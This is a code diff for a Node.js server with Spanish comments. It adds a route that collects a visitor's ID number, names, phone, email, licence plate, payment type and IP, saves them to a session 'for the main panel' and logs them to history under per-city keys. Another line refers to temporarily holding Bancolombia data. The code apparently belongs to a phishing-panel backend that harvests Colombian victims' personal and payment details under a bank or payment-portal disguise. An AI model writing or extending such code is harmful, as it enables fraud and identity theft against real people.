@@ -25,7 +25,7 @@ const ultimaAccionSesiones = new Map();
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
-const bcSesiones = new Map(); // 🔥 Almacena los datos de Bancolombia temporalmente
+const bcSesiones = new Map();
 
 let ipsBloqueadas = new Set();
 const IP_BLOQUEADAS_FILE = path.join(DATA_DIR, 'bloqueadas.json');
@@ -456,6 +456,36 @@ const server = http.createServer(async (req, res) => {
         }
 
         json(res, 404, { ok: false, error: 'Ruta admin no encontrada' });
+        return;
+    }
+
+    // ============================================================
+    // 🔥 RUTA DE CONSULTA INICIAL (Guarda en Historial)
+    // ============================================================
+    const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
+    if (req.method === 'POST' && consultaMatch) {
+        try {
+            const bancoKey = 'cc-' + consultaMatch[1];
+            const datos = await getBody(req);
+            const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
+            if (!sessionId) { json(res, 400, { ok: false }); return; }
+
+            // 🔥 GUARDAMOS LOS DATOS EN LA SESIÓN (Para el panel principal)
+            const datosPrevios = datosSesiones.get(sessionId) || {};
+            const datosCompletos = Object.assign({}, datosPrevios, {
+                tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio,
+                ip: ip,
+                creadoEn: new Date().toISOString()
+            });
+
+            datosSesiones.set(sessionId, datosCompletos);
+            
+            // 🔥 GUARDAMOS UN REGISTRO EN EL HISTORIAL CON LOS DATOS PERSONALES
+            guardarHistorial(bancoKey, datosCompletos);
+
+            console.log(`[${bancoKey}] Consulta guardada en historial: ${sessionId} | Tel: ${telefono}`);
+            json(res, 200, { ok: true });
+        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
 
